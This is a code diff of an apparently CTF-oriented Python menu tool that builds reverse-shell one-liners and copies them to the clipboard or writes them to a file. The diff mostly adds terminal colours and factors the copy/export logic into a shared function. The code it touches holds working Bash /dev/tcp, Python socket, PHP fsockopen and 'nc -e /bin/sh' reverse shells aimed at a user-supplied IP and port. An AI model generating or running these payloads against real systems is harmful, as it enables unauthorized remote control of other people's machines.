@@ -6,6 +6,8 @@ import sys
 import os
 import pyperclip
 from time import sleep
+from colorama import Fore
+from colorama import Style
 from netifaces import interfaces, ifaddresses, AF_INET
 
 ipadd = "0.0.0.0" #Global variable for IP address
@@ -14,11 +16,11 @@ interf = "N/A" #Global variable for interface
 
 #Main function
 def main():
-    banner = """   ________               __  _____ __              __     __________________
+    banner = f"""{Style.BRIGHT}{Fore.MAGENTA}   ________               __  _____ __              __     __________________
   / ____/ /_  ___  ____ _/ /_/ ___// /_  ___  ___  / /_   / ____/_  __/ ____/
  / /   / __ \/ _ \/ __ `/ __/\__ \/ __ \/ _ \/ _ \/ __/  / /     / / / /_    
-/ /___/ / / /  __/ /_/ / /_ ___/ / / / /  __/  __/ /_   / /___  / / / __/    
-\____/_/ /_/\___/\__,_/\__//____/_/ /_/\___/\___/\__/   \____/ /_/ /_/       
+{Fore.CYAN}/ /___/ / / /  __/ /_/ / /_ ___/ / / / /  __/  __/ /_   / /___  / / / __/    
+\____/_/ /_/\___/\__,_/\__//____/_/ /_/\___/\___/\__/   \____/ /_/ /_/      {Fore.RESET}{Style.RESET_ALL}
                                                                              """
     print(banner)
     print('<------------------------------------------------------->')
@@ -27,15 +29,14 @@ def main():
     print('[*] You can use this tool to create a reverse shell')
     print("")
     print("+-------------------------------------+")
-    print("|[1] Create Reverse Shells            |")
-    print("|                                     |")
-    print("|[2] Netcat Connection                |")
-    print("|                                     |")
-    print("|[3] Set Interface IP  (IMPORTANT)    |")
+    print(f"|[1] {Fore.LIGHTYELLOW_EX}Create Reverse Shells{Fore.RESET}            |")
+    print(f"|[2] {Fore.LIGHTYELLOW_EX}Netcat Connection{Fore.RESET}                |")
+    print(f"|[3] {Fore.LIGHTYELLOW_EX}Set Interface IP{Fore.RESET} ({Fore.LIGHTRED_EX}IMPORTANT{Fore.RESET})     |")
     print("+-------------------------------------+")
     print("")
-    print("[!] Local IP : " + ipadd)
-    print("[!] Interface : " + interf)
+    print(f"{Fore.LIGHTRED_EX}[{Fore.YELLOW}#{Fore.LIGHTRED_EX}] {Fore.RED}Local IP {Fore.RESET}: {Style.BRIGHT}{Fore.CYAN}" + ipadd + f"{Fore.RESET}{Style.RESET_ALL}")
+    print(f"{Fore.LIGHTRED_EX}[{Fore.YELLOW}#{Fore.LIGHTRED_EX}] {Fore.RED}Interface {Fore.RESET}: {Style.BRIGHT}{Fore.CYAN}" + interf + f"{Fore.RESET}{Style.RESET_ALL}")
+    print("\n\n-------------")
     choice = input('\n[*] Enter your choice : ')
     match choice:                                                       #Match choice
         case '1':                                                      #Create reverse shell
@@ -48,12 +49,12 @@ def main():
 
 #Banner function
 def banner():
-    banner = """______                             _____ _          _ _
+    banner = f"""{Style.BRIGHT}{Fore.LIGHTYELLOW_EX}______                             _____ _          _ _
 | ___ \                           /  ___| |        | | |
 | |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
 |    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
-| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
-\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|
+{Fore.LIGHTRED_EX}| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
+\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|{Fore.RESET}{Style.RESET_ALL}
 <------------------------------------------------------->
 """
     print(banner)
@@ -70,6 +71,24 @@ def setIp():
     globals()['ipadd'] = getIp(interface)
     globals()['interf'] = interface
 
+def choice(shell, extention): #Choice for reverse shell
+    choice = input(
+        f'\n[*] Do you want to {Fore.YELLOW}Copy{Fore.RESET} your shell to clipboard or export as {Fore.RED}File{Fore.RESET} ? ({Fore.YELLOW}c{Fore.RESET}/{Fore.RED}f{Fore.RESET}) : ')
+    match choice:                                                                   #Match choice
+        case 'c':                                                                   #Case C for copy to clipboard
+            pyperclip.copy(shell)                                                   #Copy reverse shell command to clipboard
+            print("\n[*] Your shell is copied to Clipboard")
+            sleep(1)
+            backtomain()                                                            #Go back to main menu
+        case 'f':                                                                   #Case F for export as file
+            file = "shell." + extention                                                       #Create file name
+            with open(file, "w") as f:                                              #Open file and write reverse shell command
+                f.write(shell)                                                      #Write reverse shell command to file
+            print("\n[*] Your shell is exported as " + file)
+            sleep(1)
+            backtomain()
+    return shell, extention
+
 #Go back to main menu function
 def backtomain():
     print('\n[*] Go back to main')
@@ -80,20 +99,15 @@ def backtomain():
 #The main function for reverse shells
 def revershell():
     os.system('clear')
-    banner = """______                             _____ _          _ _ 
-| ___ \                           /  ___| |        | | |
-| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
-|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
-| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
-\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|    
-<------------------------------------------------------->
-- [1] Bash reverse_shell -
-- [2] Python reverse_shell -
-- [3] PHP reverse_shell -
-- [4] Netcat reverse_shell - 
-- [6] Exit -
-<------------------------------------------------------->"""
-    print(banner)
+    banner()
+    shells = f"""  
+- [{Style.BRIGHT}1{Style.RESET_ALL}] {Style.BRIGHT}{Fore.LIGHTBLUE_EX}Bash {Fore.BLUE}reverse_shell {Fore.RESET}{Style.RESET_ALL}
+- [{Style.BRIGHT}2{Style.RESET_ALL}] {Style.BRIGHT}{Fore.LIGHTCYAN_EX}Python {Fore.CYAN}reverse_shell {Fore.RESET}{Style.RESET_ALL}
+- [{Style.BRIGHT}3{Style.RESET_ALL}] {Style.BRIGHT}{Fore.LIGHTGREEN_EX}PHP {Fore.GREEN}reverse_shell {Fore.RESET}{Style.RESET_ALL}
+- [{Style.BRIGHT}4{Style.RESET_ALL}] {Style.BRIGHT}{Fore.LIGHTMAGENTA_EX}Netcat {Fore.MAGENTA}reverse_shell {Fore.RESET}{Style.RESET_ALL}
+- [{Style.BRIGHT}6{Style.RESET_ALL}] {Style.BRIGHT}Exit {Style.RESET_ALL}
+"""
+    print(shells)
     c_rs = input('\n[*] Enter your choice : ') #Choice for reverse shell
     match c_rs:  #Match choice
         case '1': #Bash reverse shell
@@ -125,22 +139,8 @@ def bash():
     print("\n[*] Your shell is creating...")
     sleep(1)
     shell = 'bash -i >& /dev/tcp/' + ipadd + '/' + port + ' 0>&1'                   #Create reverse shell command
-    print("[*] Your shell is created")
-    choice = input(
-        '\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
-    match choice:                                                                   #Match choice
-        case 'c':                                                                   #Case C for copy to clipboard
-            pyperclip.copy(shell)                                                   #Copy reverse shell command to clipboard
-            print("\n[*] Your shell is copied to Clipboard")
-            sleep(1)
-            backtomain()                                                            #Go back to main menu
-        case 'f':                                                                   #Case F for export as file
-            file = "shell.sh"                                                       #Create file name
-            with open(file, "w") as f:                                              #Open file and write reverse shell command
-                f.write(shell)                                                      #Write reverse shell command to file
-            print("\n[*] Your shell is exported as " + file)
-            sleep(1)
-            backtomain()
+    print("\n[*] Your shell is created")
+    choice(shell, "sh")                                                             #Call choice function for reverse shell
 
 
 def python():                                                                       #Python reverse shell function
@@ -163,21 +163,8 @@ def python():                                                                   
         '",' + port + \
             '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
     print("[*] Your shell is created")
-    choice = input(
-        '\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
-    match choice:
-        case 'c':
-            pyperclip.copy(shell)
-            print("\n[*] Your shell is copied to Clipboard")
-            sleep(1)
-            backtomain()
-        case 'f':
-            file = "shell.py"
-            with open(file, "w") as f:
-                f.write(shell)
-            print("\n[*] Your shell is exported as " + file)
-            sleep(1)
-            backtomain()
+    choice(shell, "py")
+    
 
 
 def php():                                                                         #PHP reverse shell function
@@ -199,21 +186,7 @@ def php():                                                                      
     shell = "php -r '$sock=fsockopen(" + ipadd + \
         "," + port+");exec('/bin/sh -i <&3 >&3 2>&3');'"
     print("[*] Your shell is created")
-    choice = input(
-        '\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
-    match choice:
-        case 'c':
-            pyperclip.copy(shell)
-            print("\n[*] Your shell is copied to Clipboard")
-            sleep(1)
-            backtomain()
-        case 'f':
-            file = "shell.php"
-            with open(file, "w") as f:
-                f.write(shell)
-            print("\n[*] Your shell is exported as " + file)
-            sleep(1)
-            backtomain()
+    choice(shell, "php")
 
 
 def nc():                                                                         #Netcat reverse shell function
@@ -234,21 +207,8 @@ def nc():                                                                       
     sleep(1)
     shell = "nc -e /bin/sh " + ipadd + " " + port
     print("[*] Your shell is created")
-    choice = input(
-        '\n[*] Do you want to copy your shell to Clipboard or export as File ? (c/f) : ')
-    match choice:
-        case 'c':
-            pyperclip.copy(shell)
-            print("\n[*] Your shell is copied to Clipboard")
-            sleep(1)
-            backtomain()
-        case 'f':
-            file = "shell.nc"
-            with open(file, "w") as f:
-                f.write(shell)
-            print("\n[*] Your shell is exported as " + file)
-            sleep(1)
-            backtomain()
+    choice(shell, "sh")
+    
 
 
 def netcat():
